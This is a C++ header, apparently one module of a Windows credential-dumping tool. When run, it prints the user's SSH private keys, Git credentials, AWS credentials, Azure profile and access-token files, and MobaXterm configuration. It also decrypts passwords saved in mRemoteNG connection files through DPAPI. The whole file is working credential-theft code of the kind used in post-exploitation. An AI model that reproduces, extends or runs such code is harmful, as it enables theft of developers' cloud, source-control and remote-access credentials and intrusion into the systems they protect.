#ifndef DEV_CREDENTIALS_DUMP_H
#define DEV_CREDENTIALS_DUMP_H

#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <regex>

#pragma comment(lib, "crypt32.lib")

namespace DevCredentialsDump {

    inline void PrintFile(const std::filesystem::path& p) {
        std::ifstream f(p, std::ios::binary);
        if (!f) return;
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());
        std::cout << "\n[+] File: " << p.string() << "\n" << content << "\n";
    }

    inline std::vector<BYTE> Base64Decode(const std::string& b64) {
        DWORD dwLen = 0;
        CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, NULL, &dwLen, NULL, NULL);
        std::vector<BYTE> out(dwLen);
        CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &dwLen, NULL, NULL);
        return out;
    }

    inline void ParseMRemoteNG(const std::filesystem::path& path) {
        std::ifstream f(path);
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());
        std::regex re("Password=\"([^\"]*)\"");
        auto begin = std::sregex_iterator(content.begin(), content.end(), re);
        auto end = std::sregex_iterator();
        for (auto it = begin; it != end; ++it) {
            std::string b64 = (*it)[1];
            if (b64.empty()) continue;
            auto enc = Base64Decode(b64);
            DATA_BLOB in{ static_cast<DWORD>(enc.size()), enc.data() };
            DATA_BLOB out{ 0, nullptr };
            if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
                std::string dec(reinterpret_cast<char*>(out.pbData), out.cbData);
                std::cout << "  [mRemoteNG] Password: " << dec << "\n";
                LocalFree(out.pbData);
            }
        }
    }

    inline void Run() {
        std::cout << "\n=== Developer / CLI Credentials ===\n";

        const char* up = std::getenv("USERPROFILE");
        const char* ad = std::getenv("APPDATA");
        if (!up) return;

        std::filesystem::path userProfile(up);
        std::filesystem::path appData(ad ? ad : "");

        // SSH
        std::filesystem::path sshDir = userProfile / ".ssh";
        if (std::filesystem::exists(sshDir)) {
            for (auto& p : std::filesystem::directory_iterator(sshDir)) {
                if (p.is_regular_file()) {
                    auto name = p.path().filename().wstring();
                    if (name.find(L"id_") == 0 ||
                        name.find(L"key") != std::wstring::npos)
                        PrintFile(p.path());
                }
            }
        }

        // Git
        std::filesystem::path gitCred = userProfile / ".git-credentials";
        if (std::filesystem::exists(gitCred)) PrintFile(gitCred);

        // AWS
        std::filesystem::path awsCred = userProfile / ".aws" / "credentials";
        if (std::filesystem::exists(awsCred)) PrintFile(awsCred);

        // Azure
        std::filesystem::path azureProfile = userProfile / ".azure" / "azureProfile.json";
        if (std::filesystem::exists(azureProfile)) PrintFile(azureProfile);
        std::filesystem::path azureTokens = userProfile / ".azure" / "accessTokens.json";
        if (std::filesystem::exists(azureTokens)) PrintFile(azureTokens);

        // mRemoteNG
        std::filesystem::path mremote = appData / "mRemoteNG" / "confCons.xml";
        if (std::filesystem::exists(mremote)) ParseMRemoteNG(mremote);

        // MobaXterm (raw — master password, nie DPAPI)
        std::filesystem::path moba = appData / "MobaXterm" / "MobaXterm.ini";
        if (std::filesystem::exists(moba)) PrintFile(moba);
    }
}

#endif